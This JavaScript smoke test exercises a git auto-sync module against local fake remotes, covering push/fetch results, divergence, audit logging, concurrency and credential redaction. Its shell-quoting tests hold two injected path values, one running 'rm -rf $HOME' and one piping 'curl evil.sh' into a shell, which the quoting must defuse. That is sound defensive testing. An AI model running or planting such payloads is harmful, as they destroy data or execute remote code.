#!/usr/bin/env node
/**
 * Smoke test: abrain git auto-sync to remote (ADR 0020).
 *
 * Uses a local bare git repo as a fake remote so the smoke runs offline
 * and deterministically. Validates the full taxonomy in git-sync.ts:
 *
 *   1. hasGitRemote: false for non-git dir
 *   2. hasGitRemote: false for git dir without origin
 *   3. hasGitRemote: true for git dir with origin
 *   4. pushAsync on non-git: skipped (no throw, audit recorded)
 *   5. pushAsync ahead=0: noop (no push invoked)
 *   6. pushAsync ahead>0: ok (commits land on remote)
 *   7. pushAsync diverged remote: push_rejected
 *   8. fetchAndFF on non-git: skipped
 *   9. fetchAndFF behind=0: noop
 *  10. fetchAndFF pure ff: ok (local catches up to remote)
 *  11. fetchAndFF diverged: diverged (no auto-merge — ADR 0020 invariant)
 *  12. sync: combined fetch+push happy path
 *  13. sync: diverged surfaces runbook string
 *  14. getStatus snapshot (ahead/behind + last events from audit)
 *  15. formatSyncStatus is a non-empty multi-line string
 *  16. Audit log accumulates one row per op
 *  17. Single-flight: two concurrent pushAsync don't both invoke git push
 *
 * Strategy: real git binary subprocess (already required by sediment writer
 * + abrain bootstrap), local file:// remote, no network. The bare repo
 * acts as authoritative origin/main; we simulate "device B push" by
 * pushing directly to it from a second clone (simulating divergence).
 */

import { createRequire } from "node:module";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.resolve(__dirname, "..");
const require = createRequire(import.meta.url);
const ts = require("typescript");

const failures = [];
let totalChecks = 0;

function check(name, fn) {
  totalChecks++;
  try {
    fn();
    console.log(`  ok    ${name}`);
  } catch (err) {
    failures.push({ name, err });
    console.log(`  FAIL  ${name}\n        ${err.message}`);
  }
}

async function asyncCheck(name, fn) {
  totalChecks++;
  try {
    await fn();
    console.log(`  ok    ${name}`);
  } catch (err) {
    failures.push({ name, err });
    console.log(`  FAIL  ${name}\n        ${err.message}`);
  }
}

function transpile(srcPath) {
  return ts.transpileModule(fs.readFileSync(srcPath, "utf8"), {
    compilerOptions: {
      module: ts.ModuleKind.CommonJS,
      target: ts.ScriptTarget.ES2022,
      esModuleInterop: true,
      moduleResolution: ts.ModuleResolutionKind.NodeJs,
    },
  }).outputText;
}

function git(cwd, args, opts = {}) {
  const env = {
    ...process.env,
    GIT_AUTHOR_NAME: "Smoke",
    GIT_AUTHOR_EMAIL: "smoke@local",
    GIT_COMMITTER_NAME: "Smoke",
    GIT_COMMITTER_EMAIL: "smoke@local",
  };
  const res = spawnSync("git", args, { cwd, env, encoding: "utf-8", ...opts });
  if (res.status !== 0 && !opts.allowFail) {
    throw new Error(`git ${args.join(" ")} failed (${res.status}): ${res.stderr}`);
  }
  return res;
}

// ── Compile git-sync.ts ────────────────────────────────────────────
const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "pi-astack-git-sync-"));
fs.writeFileSync(
  path.join(tmpDir, "git-sync.cjs"),
  transpile(path.join(repoRoot, "extensions/abrain/git-sync.ts")),
);
const gitSync = require(path.join(tmpDir, "git-sync.cjs"));

// ── Set up fake remote (bare repo) ─────────────────────────────────
// Workspace layout under tmpDir:
//   remote.git/        bare repo acting as origin
//   deviceA/.abrain/   primary local clone (the one we drive with git-sync)
//   deviceB/.abrain/   secondary clone used to simulate "another device pushed"
//   noremote/.abrain/  git repo without an origin remote
//   notgit/            plain dir, not a git repo

const remoteDir = path.join(tmpDir, "remote.git");
const deviceA = path.join(tmpDir, "deviceA", ".abrain");
const deviceB = path.join(tmpDir, "deviceB", ".abrain");
const noRemote = path.join(tmpDir, "noremote", ".abrain");
const notGit = path.join(tmpDir, "notgit");

fs.mkdirSync(remoteDir, { recursive: true });
fs.mkdirSync(path.dirname(deviceA), { recursive: true });
fs.mkdirSync(path.dirname(deviceB), { recursive: true });
fs.mkdirSync(noRemote, { recursive: true });
fs.mkdirSync(notGit, { recursive: true });

git(remoteDir, ["init", "--bare", "--initial-branch=main"]);

// Bootstrap deviceA with one commit so origin/main exists on remote.
git(path.dirname(deviceA), ["clone", remoteDir, ".abrain"]);
fs.writeFileSync(path.join(deviceA, "seed.md"), "# initial\n");
git(deviceA, ["add", "seed.md"]);
git(deviceA, ["commit", "-m", "initial"]);
git(deviceA, ["branch", "-M", "main"]);
git(deviceA, ["push", "-u", "origin", "main"]);

// Clone deviceB from same remote so it shares history.
git(path.dirname(deviceB), ["clone", remoteDir, ".abrain"]);
git(deviceB, ["checkout", "main"]);

// noRemote: git repo without origin
git(noRemote, ["init", "--initial-branch=main"]);
fs.writeFileSync(path.join(noRemote, "x.md"), "x\n");
git(noRemote, ["add", "x.md"]);
git(noRemote, ["commit", "-m", "x"]);

// notGit: just a directory

console.log(`tmp workspace: ${tmpDir}`);
console.log(`fake remote:   ${remoteDir}`);

// ── 1. hasGitRemote taxonomy ───────────────────────────────────────
console.log("\n[1] hasGitRemote taxonomy");
await asyncCheck("hasGitRemote returns false for non-git directory", async () => {
  const r = await gitSync.hasGitRemote(notGit);
  if (r !== false) throw new Error(`expected false, got ${r}`);
});
await asyncCheck("hasGitRemote returns false for git repo without origin", async () => {
  const r = await gitSync.hasGitRemote(noRemote);
  if (r !== false) throw new Error(`expected false, got ${r}`);
});
await asyncCheck("hasGitRemote returns true for git repo with origin", async () => {
  const r = await gitSync.hasGitRemote(deviceA);
  if (r !== true) throw new Error(`expected true, got ${r}`);
});

// ── 2. pushAsync on inactive backends → skipped ────────────────────
console.log("\n[2] pushAsync inactive cases (skipped)");
await asyncCheck("pushAsync on non-git dir returns skipped (no throw)", async () => {
  const ev = await gitSync.pushAsync({ abrainHome: notGit });
  if (ev.result !== "skipped") throw new Error(`expected skipped, got ${ev.result}`);
  if (ev.op !== "push") throw new Error(`expected op=push, got ${ev.op}`);
});
await asyncCheck("pushAsync on git-without-remote returns skipped", async () => {
  const ev = await gitSync.pushAsync({ abrainHome: noRemote });
  if (ev.result !== "skipped") throw new Error(`expected skipped, got ${ev.result}`);
});

// ── 3. pushAsync ahead=0 → noop ────────────────────────────────────
console.log("\n[3] pushAsync noop / ok happy path");
await asyncCheck("pushAsync with ahead=0 returns noop (no commits to push)", async () => {
  // deviceA is already synced after initial push
  const ev = await gitSync.pushAsync({ abrainHome: deviceA });
  if (ev.result !== "noop") throw new Error(`expected noop, got ${ev.result} (error: ${ev.error})`);
  if (ev.ahead !== 0) throw new Error(`expected ahead=0, got ${ev.ahead}`);
});

// Make a local commit on A, then push.
fs.writeFileSync(path.join(deviceA, "a-only.md"), "from device A\n");
git(deviceA, ["add", "a-only.md"]);
git(deviceA, ["commit", "-m", "from A"]);
await asyncCheck("pushAsync with ahead=1 returns ok and lands commit on remote", async () => {
  const ev = await gitSync.pushAsync({ abrainHome: deviceA });
  if (ev.result !== "ok") throw new Error(`expected ok, got ${ev.result} (error: ${ev.error})`);
  // Verify remote actually has the commit
  const log = git(remoteDir, ["log", "--oneline", "-5"]);
  if (!log.stdout.includes("from A")) {
    throw new Error(`remote bare repo doesn't contain expected commit:\n${log.stdout}`);
  }
});

// ── 4. pushAsync diverged → push_rejected ──────────────────────────
console.log("\n[4] pushAsync rejected (remote diverged)");

// Simulate device B pushing a commit while device A is unaware.
fs.writeFileSync(path.join(deviceB, "b-only.md"), "from device B\n");
git(deviceB, ["pull", "origin", "main"]); // get device A's latest first
git(deviceB, ["add", "b-only.md"]);
git(deviceB, ["commit", "-m", "from B"]);
git(deviceB, ["push", "origin", "main"]);

// Now device A makes another local commit without knowing remote moved.
fs.writeFileSync(path.join(deviceA, "a-extra.md"), "more from A\n");
git(deviceA, ["add", "a-extra.md"]);
git(deviceA, ["commit", "-m", "more from A"]);

// pushAsync should report push_rejected. (Note: ahead/behind comparison
// uses origin/main as last fetched, so locally we appear ahead. The
// classification depends on push stderr containing "rejected"/"non-fast-forward".)
await asyncCheck("pushAsync against diverged remote returns push_rejected", async () => {
  const ev = await gitSync.pushAsync({ abrainHome: deviceA });
  if (ev.result !== "push_rejected") {
    throw new Error(`expected push_rejected, got ${ev.result} (error: ${ev.error})`);
  }
  if (!ev.error) throw new Error("expected error field with stderr");
});

// ── 5. fetchAndFF inactive cases ───────────────────────────────────
console.log("\n[5] fetchAndFF inactive cases");
await asyncCheck("fetchAndFF on non-git returns skipped", async () => {
  const ev = await gitSync.fetchAndFF({ abrainHome: notGit });
  if (ev.result !== "skipped") throw new Error(`expected skipped, got ${ev.result}`);
  if (ev.op !== "fetch") throw new Error(`expected op=fetch, got ${ev.op}`);
});

// ── 6. fetchAndFF diverged ─────────────────────────────────────────
// deviceA still has unsynced "more from A" + remote has B's commit.
console.log("\n[6] fetchAndFF diverged (no auto-merge)");
await asyncCheck("fetchAndFF with both sides ahead returns diverged (does not auto-merge)", async () => {
  const ev = await gitSync.fetchAndFF({ abrainHome: deviceA });
  if (ev.result !== "diverged") {
    throw new Error(`expected diverged, got ${ev.result} (error: ${ev.error})`);
  }
  if (!ev.ahead || ev.ahead < 1) throw new Error(`expected ahead>=1, got ${ev.ahead}`);
  if (!ev.behind || ev.behind < 1) throw new Error(`expected behind>=1, got ${ev.behind}`);
  if (!ev.error || !ev.error.includes("ff-only refused")) {
    throw new Error(`expected error to mention ff-only refused, got: ${ev.error}`);
  }
  // ADR 0020 invariant: working tree must NOT have been auto-merged.
  const log = git(deviceA, ["log", "--oneline", "-3"]);
  if (log.stdout.includes("from B")) {
    throw new Error("CRITICAL: ff-only refused but B's commit somehow ended up in local — auto-merge happened!");
  }
});

// ── 7. fetchAndFF pure ff (no local commits) ───────────────────────
console.log("\n[7] fetchAndFF pure fast-forward");
// Reset device A to a state where it's purely behind remote.
git(deviceA, ["reset", "--hard", "origin/main"]); // discard "more from A"
// Have device B push another commit.
fs.writeFileSync(path.join(deviceB, "b-extra.md"), "more from B\n");
git(deviceB, ["add", "b-extra.md"]);
git(deviceB, ["commit", "-m", "more from B"]);
git(deviceB, ["push", "origin", "main"]);

await asyncCheck("fetchAndFF with only remote ahead returns ok and ff-merges", async () => {
  const ev = await gitSync.fetchAndFF({ abrainHome: deviceA });
  if (ev.result !== "ok") {
    throw new Error(`expected ok, got ${ev.result} (error: ${ev.error})`);
  }
  if (!ev.behind || ev.behind < 1) throw new Error(`expected behind>=1, got ${ev.behind}`);
  const log = git(deviceA, ["log", "--oneline", "-3"]);
  if (!log.stdout.includes("more from B")) {
    throw new Error(`expected fast-forward to bring 'more from B' into local:\n${log.stdout}`);
  }
});

await asyncCheck("fetchAndFF with no remote changes returns noop", async () => {
  const ev = await gitSync.fetchAndFF({ abrainHome: deviceA });
  if (ev.result !== "noop") {
    throw new Error(`expected noop, got ${ev.result}`);
  }
});

// ── 8. sync() combined op happy path ──────────────────────────────
console.log("\n[8] sync() combined fetch+push");
// Device A: ff'd up, no diverge, one new local commit to push.
fs.writeFileSync(path.join(deviceA, "a-sync.md"), "sync test\n");
git(deviceA, ["add", "a-sync.md"]);
git(deviceA, ["commit", "-m", "sync test"]);

await asyncCheck("sync() fetches + pushes when no divergence", async () => {
  const result = await gitSync.sync({ abrainHome: deviceA });
  if (!result.ok) throw new Error(`expected ok, got summary: ${result.summary}`);
  if (!result.summary.includes("synced")) {
    throw new Error(`expected 'synced' in summary, got: ${result.summary}`);
  }
  if (result.events.length !== 2) {
    throw new Error(`expected 2 events (fetch+push), got ${result.events.length}`);
  }
  const log = git(remoteDir, ["log", "--oneline", "-5"]);
  if (!log.stdout.includes("sync test")) {
    throw new Error(`remote missing 'sync test' commit:\n${log.stdout}`);
  }
});

// ── 9. sync() diverged surfaces runbook ───────────────────────────
console.log("\n[9] sync() diverged returns runbook");
// Make deviceA and remote diverge again.
fs.writeFileSync(path.join(deviceB, "b-final.md"), "B final\n");
git(deviceB, ["pull", "origin", "main"]);
git(deviceB, ["add", "b-final.md"]);
git(deviceB, ["commit", "-m", "B final"]);
git(deviceB, ["push", "origin", "main"]);

fs.writeFileSync(path.join(deviceA, "a-final.md"), "A final\n");
git(deviceA, ["add", "a-final.md"]);
git(deviceA, ["commit", "-m", "A final"]);

await asyncCheck("sync() on diverged surfaces runbook with cd/git commands", async () => {
  const result = await gitSync.sync({ abrainHome: deviceA });
  if (result.ok) throw new Error(`expected ok=false on diverged`);
  // Note: deviceA is shell-quoted per Round 2 audit fix (opus M2), so we
  // assert on `cd '<deviceA>'` here. Section 15 has a dedicated test
  // pinning the exact quoted form.
  for (const hint of ["diverged", `cd '${deviceA}'`, "git fetch", "git merge", "git rebase", "/abrain sync"]) {
    if (!result.summary.includes(hint)) {
      throw new Error(`expected hint '${hint}' in summary, got: ${result.summary}`);
    }
  }
  // Push must NOT have been attempted when fetch returned diverged.
  if (result.events.length !== 1) {
    throw new Error(`expected 1 event (fetch only — push skipped), got ${result.events.length}`);
  }
});

// ── 10. getStatus snapshot ────────────────────────────────────────
console.log("\n[10] getStatus snapshot");
await asyncCheck("getStatus returns isGitRepo=false for non-git dir", async () => {
  const s = await gitSync.getStatus(notGit);
  if (s.isGitRepo !== false) throw new Error(`expected isGitRepo=false`);
  if (s.ahead !== 0 || s.behind !== 0) throw new Error("expected zero counters");
});

await asyncCheck("getStatus returns remote/branch/ahead/behind on diverged repo", async () => {
  const s = await gitSync.getStatus(deviceA);
  if (!s.isGitRepo) throw new Error("expected isGitRepo=true");
  if (!s.remote || !s.remote.includes("remote.git")) {
    throw new Error(`expected remote pointing to bare repo, got: ${s.remote}`);
  }
  if (s.branch !== "main") throw new Error(`expected branch=main, got: ${s.branch}`);
  if (!s.ahead || s.ahead < 1) throw new Error(`expected ahead>=1, got ${s.ahead}`);
  if (!s.behind || s.behind < 1) throw new Error(`expected behind>=1, got ${s.behind}`);
  if (!s.lastFetch) throw new Error("expected lastFetch from audit log");
  if (!s.lastPush) throw new Error("expected lastPush from audit log");
});

// ── 11. formatSyncStatus ──────────────────────────────────────────
console.log("\n[11] formatSyncStatus output");
await asyncCheck("formatSyncStatus is non-empty and shows ahead/behind/diverged hint", async () => {
  const s = await gitSync.getStatus(deviceA);
  const out = gitSync.formatSyncStatus(s);
  if (!out || out.length < 10) throw new Error(`formatSyncStatus output too short: '${out}'`);
  if (!out.includes("ahead:")) throw new Error("missing 'ahead:'");
  if (!out.includes("behind:")) throw new Error("missing 'behind:'");
  if (s.ahead > 0 && s.behind > 0 && !out.includes("diverged")) {
    throw new Error(`expected 'diverged' hint when ahead+behind both > 0`);
  }
});

check("formatSyncStatus on non-git returns expected sentinel", () => {
  const out = gitSync.formatSyncStatus({ isGitRepo: false, ahead: 0, behind: 0 });
  if (!out.includes("not a git repo")) throw new Error(`expected 'not a git repo', got: ${out}`);
});

// ── 12. audit log accumulation ────────────────────────────────────
console.log("\n[12] audit log accumulation");
check("audit log accumulates one row per op", () => {
  const auditPath = path.join(deviceA, ".state", "git-sync.jsonl");
  if (!fs.existsSync(auditPath)) throw new Error(`audit log not found at ${auditPath}`);
  const lines = fs.readFileSync(auditPath, "utf-8").trim().split("\n");
  // We've run multiple push/fetch/sync ops above. At minimum we should see >= 8.
  if (lines.length < 8) throw new Error(`expected >= 8 audit rows, got ${lines.length}`);
  // Each line must be valid JSON with op/result/ts fields.
  for (const line of lines) {
    const ev = JSON.parse(line);
    if (!ev.ts || !ev.op || !ev.result) {
      throw new Error(`malformed audit row: ${line}`);
    }
    if (!["push", "fetch", "sync"].includes(ev.op)) {
      throw new Error(`unexpected op: ${ev.op}`);
    }
  }
});

// ── 13. single-flight in-process serialization ────────────────────
console.log("\n[13] single-flight queue serialization");
await asyncCheck("two concurrent pushAsync calls serialize (no git index.lock contention)", async () => {
  git(deviceA, ["reset", "--hard", "origin/main"], { allowFail: true });
  fs.writeFileSync(path.join(deviceA, "concurrent.md"), "concurrent\n");
  git(deviceA, ["add", "concurrent.md"]);
  git(deviceA, ["commit", "-m", "concurrent test"]);

  const [r1, r2] = await Promise.all([
    gitSync.pushAsync({ abrainHome: deviceA }),
    gitSync.pushAsync({ abrainHome: deviceA }),
  ]);

  const results = [r1.result, r2.result].sort();
  if (results[0] === "failed" || results[1] === "failed") {
    throw new Error(`expected serialized push, got results: ${results.join(",")} (errors: ${r1.error}, ${r2.error})`);
  }
  if (!(results.includes("ok") || results.every((r) => r === "noop"))) {
    throw new Error(`unexpected result combination: ${results.join(",")}`);
  }
});

await asyncCheck("3 concurrent pushAsync calls all serialize (gpt #2 TOCTOU regression test)", async () => {
  // Round 2 audit found that the previous singleFlight had a TOCTOU race:
  // when 3+ callers all awaited the same prior inflightOp, they each ran
  // fn() in parallel after the prior resolved. The new tail-chained queue
  // runs them strictly serially. The previous smoke (2 callers only) didn't
  // exercise the bug because with 2 callers, the second naturally waited
  // on the first — the race needs >=3 to manifest.
  git(deviceA, ["reset", "--hard", "origin/main"], { allowFail: true });
  fs.writeFileSync(path.join(deviceA, "three-way.md"), "three-way\n");
  git(deviceA, ["add", "three-way.md"]);
  git(deviceA, ["commit", "-m", "three-way concurrent"]);

  const [r1, r2, r3] = await Promise.all([
    gitSync.pushAsync({ abrainHome: deviceA }),
    gitSync.pushAsync({ abrainHome: deviceA }),
    gitSync.pushAsync({ abrainHome: deviceA }),
  ]);

  const results = [r1.result, r2.result, r3.result];
  for (const r of [r1, r2, r3]) {
    if (r.result === "failed" && r.error && /index\.lock/i.test(r.error)) {
      throw new Error(`single-flight queue regression: index.lock contention in 3-way race. Results: ${JSON.stringify(results)} Errors: ${r.error}`);
    }
  }
  // Exactly one should be 'ok' (the first to actually push); the other two
  // should be 'noop' (saw nothing to push after the first completed).
  const okCount = results.filter((r) => r === "ok").length;
  const noopCount = results.filter((r) => r === "noop").length;
  if (okCount !== 1 || noopCount !== 2) {
    throw new Error(`expected exactly 1 ok + 2 noop in 3-way queue, got: ${JSON.stringify(results)}`);
  }
});

// [14] PI_ABRAIN_NO_AUTOSYNC contract
console.log("\n[14] PI_ABRAIN_NO_AUTOSYNC env contract");
await asyncCheck("git-sync ops still execute when called directly under PI_ABRAIN_NO_AUTOSYNC=1 (env is caller-layer gate)", async () => {
  // Round 2 audit (deepseek M3): document the contract that git-sync.ts
  // is policy-neutral. The env var gates AUTO callers (abrain extension
  // activate, sediment writer post-commit) but not direct API users like
  // /abrain sync. This smoke pins that contract so a future refactor
  // doesn't accidentally wire the env check INTO git-sync.ts and break
  // /abrain sync's intentional manual-override semantics.
  const prev = process.env.PI_ABRAIN_NO_AUTOSYNC;
  process.env.PI_ABRAIN_NO_AUTOSYNC = "1";
  try {
    const r = await gitSync.pushAsync({ abrainHome: deviceA, timeoutMs: 5000 });
    if (!["ok", "noop", "skipped", "push_rejected"].includes(r.result)) {
      throw new Error(`unexpected result under PI_ABRAIN_NO_AUTOSYNC=1: ${r.result} (${r.error})`);
    }
  } finally {
    if (prev === undefined) delete process.env.PI_ABRAIN_NO_AUTOSYNC;
    else process.env.PI_ABRAIN_NO_AUTOSYNC = prev;
  }
});

// [15] Round 2 audit: credential redaction + path quoting
console.log("\n[15] credential redaction + shell-quoted runbook path (Round 2 audit)");
check("redactCredentials strips user:pass from https URLs", () => {
  const cases = [
    ["https://alice:secret@host.example.com/repo.git", "https://***@host.example.com/repo.git"],
    ["https://token@host/path",                         "https://***@host/path"],
    ["http://u:p@host/r",                                "http://***@host/r"],
    ["git@github.com:user/repo.git",                     "git@github.com:user/repo.git"],
    ["https://host/no-userinfo.git",                     "https://host/no-userinfo.git"],
    ["fatal: unable to access 'https://alice:tok@host/x' returned 401", "fatal: unable to access 'https://***@host/x' returned 401"],
  ];
  for (const [input, expected] of cases) {
    const got = gitSync.redactCredentials(input);
    if (got !== expected) throw new Error(`redactCredentials('${input}') = '${got}', expected '${expected}'`);
  }
});

check("shellQuotePath produces single-quoted POSIX-safe argument", () => {
  const cases = [
    ["/home/user/.abrain",                            "'/home/user/.abrain'"],
    ["/path with spaces/.abrain",                     "'/path with spaces/.abrain'"],
    ["/path/with/'apostrophe'/.abrain",               "'/path/with/'\\''apostrophe'\\''/.abrain'"],
    ["/tmp/evil\"; rm -rf $HOME; #",                  "'/tmp/evil\"; rm -rf $HOME; #'"],
    ["/tmp/evil'; curl evil.sh | sh; #",              "'/tmp/evil'\\''; curl evil.sh | sh; #'"],
  ];
  for (const [input, expected] of cases) {
    const got = gitSync.shellQuotePath(input);
    if (got !== expected) throw new Error(`shellQuotePath('${input}') = '${got}', expected '${expected}'`);
  }
});

check("shellQuotePath refuses control characters with safe placeholder", () => {
  const got = gitSync.shellQuotePath("/path/with\nnewline");
  if (!got.includes("control characters")) throw new Error(`expected control-char placeholder, got: ${got}`);
  if (got.includes("\n")) throw new Error(`shellQuotePath leaked newline: ${JSON.stringify(got)}`);
});

await asyncCheck("sync() runbook contains shell-quoted abrainHome (opus M2 regression test)", async () => {
  // Re-create divergence so we get the runbook string.
  fs.writeFileSync(path.join(deviceB, "r2-quote.md"), "r2-quote\n");
  git(deviceB, ["pull", "origin", "main"], { allowFail: true });
  git(deviceB, ["add", "r2-quote.md"]);
  git(deviceB, ["commit", "-m", "r2-quote test"]);
  git(deviceB, ["push", "origin", "main"]);
  fs.writeFileSync(path.join(deviceA, "r2-quote-A.md"), "r2-quote-A\n");
  git(deviceA, ["add", "r2-quote-A.md"]);
  git(deviceA, ["commit", "-m", "r2-quote-A"]);
  const result = await gitSync.sync({ abrainHome: deviceA });
  if (!result.summary.includes("diverged")) throw new Error(`expected diverged, got: ${result.summary}`);
  // The path must be wrapped in single quotes per shellQuotePath.
  const expectedQuoted = `'${deviceA}'`;
  if (!result.summary.includes(expectedQuoted)) {
    throw new Error(`runbook missing shell-quoted abrainHome ${expectedQuoted}\nGot: ${result.summary}`);
  }
});

// [16] _queueDepth() exposed for tests
console.log("\n[16] _queueDepth() introspection");
check("_queueDepth returns hasInflight=true after first op flowed through", () => {
  const depth = gitSync._queueDepth();
  if (depth.hasInflight !== true) throw new Error(`expected hasInflight=true after >40 ops, got: ${JSON.stringify(depth)}`);
});

// ── Cleanup ────────────────────────────────────────────────────────
// Round 2 audit fix (deepseek n3): cleanup is best-effort — if any check
// above had thrown unhandled (we use try/catch internally so this is
// theoretical), tmpDir would leak. Wrap to harden.
try {
  fs.rmSync(tmpDir, { recursive: true, force: true });
} catch {
  // tmpDir cleanup failed; not a smoke failure.
}

// Report──────────────────────────────────────────────────────
console.log(`\nTotal: ${totalChecks} checks, ${failures.length} failed`);
if (failures.length > 0) {
  console.log("\nFailures:");
  for (const { name, err } of failures) {
    console.log(`  ✗ ${name}: ${err.message}`);
  }
  process.exit(1);
}
console.log("all ok");
